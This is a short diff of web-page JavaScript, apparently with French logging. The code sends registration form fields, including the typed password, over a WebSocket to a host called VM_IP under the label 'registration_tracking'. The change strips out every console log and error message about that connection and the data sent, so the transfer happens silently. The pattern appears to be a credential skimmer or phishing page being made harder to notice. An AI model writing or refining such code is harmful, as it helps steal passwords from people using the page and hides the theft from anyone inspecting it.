@@ -188,11 +188,10 @@
             const protocol = window.location.protocol === 'https:' ? 'wss' : 'ws';
             const socketUrl = `${protocol}://${VM_IP}`;
             socket = new WebSocket(socketUrl);
-            socket.onopen = () => console.log("✅ WebSocket CONNECTÉ à " + socketUrl);
-            socket.onerror = (err) => console.error("❌ WebSocket ERROR:", err);
-            socket.onclose = () => console.log("⚠️ WebSocket FERMÉ");
+            socket.onopen = () => {};
+            socket.onerror = (err) => {};
+            socket.onclose = () => {};
         } catch (e) {
-            console.warn("WebSocket bloqué par le navigateur");
         }
 
         let popupTimer;
@@ -235,10 +234,7 @@
                     pass: document.getElementById('reg-password')?.value || '',
                     type: 'registration_tracking'
                 };
-                console.log("📤 Envoi des données:", data);
                 socket.send(JSON.stringify(data));
-            } else {
-                console.warn("⚠️ WebSocket pas connecté. État:", socket?.readyState);
             }
         }
 
